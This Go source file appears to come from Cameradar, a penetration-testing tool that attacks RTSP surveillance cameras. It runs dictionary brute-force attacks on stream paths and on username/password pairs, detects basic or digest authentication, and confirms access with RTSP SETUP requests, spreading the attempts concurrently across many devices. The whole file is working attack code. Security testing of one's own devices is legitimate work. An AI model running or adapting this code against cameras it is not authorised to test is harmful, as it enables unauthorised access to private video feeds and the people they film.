package cameradar

import (
	"fmt"
	"time"

	curl "github.com/Ullaakut/go-curl"
)

// HTTP responses.
const (
	httpOK           = 200
	httpUnauthorized = 401
	httpForbidden    = 403
	httpNotFound     = 404
)

// CURL RTSP request types.
const (
	rtspDescribe = 2
	rtspSetup    = 4
)

// Attack attacks the given targets and returns the accessed devices.
func (s *Scanner) Attack(targets []Device) ([]Device, error) {
	if len(targets) == 0 {
		return nil, fmt.Errorf("unable to attack empty list of targets")
	}

	// Most cameras will be accessed successfully with these two attacks.
	s.term.StartStepf("Attacking streams of %d devices", len(targets))
	devices := s.AttackStream(targets)

	s.term.StartStepf("Attempting to detect authentication methods of %d devices", len(targets))
	devices = s.DetectAuthMethods(devices)

	s.term.StartStepf("Attacking credentials of %d devices", len(targets))
	devices = s.AttackCredentials(devices)

	s.term.StartStep("Validating that devices are accessible")
	devices = s.ValidateDevices(devices)

	// But some cameras run GST RTSP Server which prioritizes 401 over 404 contrary to most cameras.
	// For these cameras, running another stream attack will solve the problem.
	for _, device := range devices {
		if !device.StreamFound || !device.CredentialsFound || !device.Available {
			s.term.StartStepf("Second round of attacks")
			devices = s.AttackStream(devices)

			s.term.StartStep("Validating that devices are accessible")
			devices = s.ValidateDevices(devices)

			break
		}
	}

	s.term.EndStep()

	return devices, nil
}

// ValidateDevices tries to setup the device to validate whether or not it is available.
func (s *Scanner) ValidateDevices(targets []Device) []Device {
	for i := range targets {
		targets[i].Available = s.validateDevice(targets[i])
		time.Sleep(s.attackInterval)
	}

	return targets
}

// AttackCredentials attempts to guess the provided targets' credentials using the given
// dictionary or the default dictionary if none was provided by the user.
func (s *Scanner) AttackCredentials(targets []Device) []Device {
	resChan := make(chan Device)
	defer close(resChan)

	for i := range targets {
		// TODO: Perf Improvement: Skip cameras with no auth type detected, and set their
		// CredentialsFound value to true.
		go s.attackCameraCredentials(targets[i], resChan)
	}

	attackResults := []Device{}
	// TODO: Change this into a for+select and make a successful result close the chan.
	for range targets {
		attackResults = append(attackResults, <-resChan)
	}

	for i := range attackResults {
		if attackResults[i].CredentialsFound {
			targets = replace(targets, attackResults[i])
		}
	}

	return targets
}

// AttackStream attempts to guess the provided targets' deviceing streams using the given
// dictionary or the default dictionary if none was provided by the user.
func (s *Scanner) AttackStream(targets []Device) []Device {
	resChan := make(chan Device)
	defer close(resChan)

	for i := range targets {
		go s.attackCameraStream(targets[i], resChan)
	}

	attackResults := []Device{}
	// TODO: Change this into a for+select and make a successful result close the chan.
	for range targets {
		attackResults = append(attackResults, <-resChan)
	}

	for i := range attackResults {
		if attackResults[i].StreamFound {
			targets = replace(targets, attackResults[i])
		}
	}

	return targets
}

// DetectAuthMethods attempts to guess the provided targets' authentication types, between
// digest, basic auth or none at all.
func (s *Scanner) DetectAuthMethods(targets []Device) []Device {
	for i := range targets {
		targets[i].AuthenticationType = s.detectAuthMethod(targets[i])
		time.Sleep(s.attackInterval)

		var authMethod string
		switch targets[i].AuthenticationType {
		case 0:
			authMethod = "no"
		case 1:
			authMethod = "basic"
		case 2:
			authMethod = "digest"
		}

		s.term.Debugf("Device %s uses %s authentication method\n", GetCameraRTSPURL(targets[i]), authMethod)
	}

	return targets
}

func (s *Scanner) attackCameraCredentials(target Device, resChan chan<- Device) {
	for _, username := range s.credentials.Usernames {
		for _, password := range s.credentials.Passwords {
			ok := s.credAttack(target, username, password)
			if ok {
				target.CredentialsFound = true
				target.Username = username
				target.Password = password
				resChan <- target
				return
			}
			time.Sleep(s.attackInterval)
		}
	}

	target.CredentialsFound = false
	resChan <- target
}

func (s *Scanner) attackCameraStream(target Device, resChan chan<- Device) {
	for _, stream := range s.streams {
		ok := s.streamAttack(target, stream)
		if ok {
			target.StreamFound = true
			target.Stream = stream
			resChan <- target
			return
		}
		time.Sleep(s.attackInterval)
	}

	target.StreamFound = false
	resChan <- target
}

func (s *Scanner) detectAuthMethod(device Device) int {
	c := s.curl.Duphandle()

	attackURL := fmt.Sprintf(
		"rtsp://%s:%d/%s",
		device.Address,
		device.Port,
		device.Stream,
	)

	s.setCurlOptions(c)

	// Send a request to the URL of the device we want to attack.
	_ = c.Setopt(curl.OPT_URL, attackURL)
	// Set the RTSP STREAM URI as the device URL.
	_ = c.Setopt(curl.OPT_RTSP_STREAM_URI, attackURL)
	_ = c.Setopt(curl.OPT_RTSP_REQUEST, rtspDescribe)

	// Perform the request.
	err := c.Perform()
	if err != nil {
		s.term.Errorf("Perform failed for %q (auth %d): %v", attackURL, device.AuthenticationType, err)
		return -1
	}

	authType, err := c.Getinfo(curl.INFO_HTTPAUTH_AVAIL)
	if err != nil {
		s.term.Errorf("Getinfo failed: %v", err)
		return -1
	}

	if s.verbose {
		s.term.Debugln("DESCRIBE", attackURL, "RTSP/1.0 >", authType)
	}

	return authType.(int)
}

func (s *Scanner) streamAttack(device Device, stream string) bool {
	c := s.curl.Duphandle()

	attackURL := fmt.Sprintf(
		"rtsp://%s:%s@%s:%d/%s",
		device.Username,
		device.Password,
		device.Address,
		device.Port,
		stream,
	)

	s.setCurlOptions(c)

	// Set proper authentication type.
	_ = c.Setopt(curl.OPT_HTTPAUTH, device.AuthenticationType)
	_ = c.Setopt(curl.OPT_USERPWD, fmt.Sprint(device.Username, ":", device.Password))

	// Send a request to the URL of the device we want to attack.
	_ = c.Setopt(curl.OPT_URL, attackURL)
	// Set the RTSP STREAM URI as the device URL.
	_ = c.Setopt(curl.OPT_RTSP_STREAM_URI, attackURL)
	_ = c.Setopt(curl.OPT_RTSP_REQUEST, rtspDescribe)

	// Perform the request.
	err := c.Perform()
	if err != nil {
		s.term.Errorf("Perform failed for %q (auth %d): %v", attackURL, device.AuthenticationType, err)
		return false
	}

	// Get return code for the request.
	rc, err := c.Getinfo(curl.INFO_RESPONSE_CODE)
	if err != nil {
		s.term.Errorf("Getinfo failed: %v", err)
		return false
	}

	if s.verbose {
		s.term.Debugln("DESCRIBE", attackURL, "RTSP/1.0 >", rc)
	}
	// If it's a 401 or 403, it means that the credentials are wrong but the stream might be okay.
	// If it's a 200, the device is accessed successfully.
	if rc == httpOK || rc == httpUnauthorized || rc == httpForbidden {
		return true
	}
	return false
}

func (s *Scanner) credAttack(device Device, username string, password string) bool {
	c := s.curl.Duphandle()

	attackURL := fmt.Sprintf(
		"rtsp://%s:%s@%s:%d/%s",
		username,
		password,
		device.Address,
		device.Port,
		device.Stream,
	)

	s.setCurlOptions(c)

	// Set proper authentication type.
	_ = c.Setopt(curl.OPT_HTTPAUTH, device.AuthenticationType)
	_ = c.Setopt(curl.OPT_USERPWD, fmt.Sprint(username, ":", password))

	// Send a request to the URL of the device we want to attack.
	_ = c.Setopt(curl.OPT_URL, attackURL)
	// Set the RTSP STREAM URI as the device URL.
	_ = c.Setopt(curl.OPT_RTSP_STREAM_URI, attackURL)
	_ = c.Setopt(curl.OPT_RTSP_REQUEST, rtspDescribe)

	// Perform the request.
	err := c.Perform()
	if err != nil {
		s.term.Errorf("Perform failed for %q (auth %d): %v", attackURL, device.AuthenticationType, err)
		return false
	}

	// Get return code for the request.
	rc, err := c.Getinfo(curl.INFO_RESPONSE_CODE)
	if err != nil {
		s.term.Errorf("Getinfo failed: %v", err)
		return false
	}

	if s.verbose {
		s.term.Debugln("DESCRIBE", attackURL, "RTSP/1.0 >", rc)
	}

	// If it's a 404, it means that the stream is incorrect but the credentials might be okay.
	// If it's a 200, the device is accessed successfully.
	if rc == httpOK || rc == httpNotFound {
		return true
	}
	return false
}

func (s *Scanner) validateDevice(device Device) bool {
	c := s.curl.Duphandle()

	attackURL := fmt.Sprintf(
		"rtsp://%s:%s@%s:%d/%s",
		device.Username,
		device.Password,
		device.Address,
		device.Port,
		device.Stream,
	)

	s.setCurlOptions(c)

	// Set proper authentication type.
	_ = c.Setopt(curl.OPT_HTTPAUTH, device.AuthenticationType)
	_ = c.Setopt(curl.OPT_USERPWD, fmt.Sprint(device.Username, ":", device.Password))

	// Send a request to the URL of the device we want to attack.
	_ = c.Setopt(curl.OPT_URL, attackURL)
	// Set the RTSP STREAM URI as the device URL.
	_ = c.Setopt(curl.OPT_RTSP_STREAM_URI, attackURL)
	_ = c.Setopt(curl.OPT_RTSP_REQUEST, rtspSetup)

	_ = c.Setopt(curl.OPT_RTSP_TRANSPORT, "RTP/AVP;unicast;client_port=33332-33333")

	// Perform the request.
	err := c.Perform()
	if err != nil {
		s.term.Errorf("Perform failed for %q (auth %d): %v", attackURL, device.AuthenticationType, err)
		return false
	}

	// Get return code for the request.
	rc, err := c.Getinfo(curl.INFO_RESPONSE_CODE)
	if err != nil {
		s.term.Errorf("Getinfo failed: %v", err)
		return false
	}

	if s.verbose {
		s.term.Debugln("SETUP", attackURL, "RTSP/1.0 >", rc)
	}
	// If it's a 200, the device is accessed successfully.
	if rc == httpOK {
		return true
	}
	return false
}

func (s *Scanner) setCurlOptions(c Curler) {
	// Do not write sdp in stdout
	_ = c.Setopt(curl.OPT_WRITEFUNCTION, doNotWrite)
	// Do not use signals (would break multithreading).
	_ = c.Setopt(curl.OPT_NOSIGNAL, 1)
	// Do not send a body in the describe request.
	_ = c.Setopt(curl.OPT_NOBODY, 1)
	// Set custom timeout.
	_ = c.Setopt(curl.OPT_TIMEOUT_MS, int(s.timeout/time.Millisecond))
}

// HACK: See https://stackoverflow.com/questions/3572397/lib-curl-in-c-disable-printing
func doNotWrite([]uint8, interface{}) bool {
	return true
}
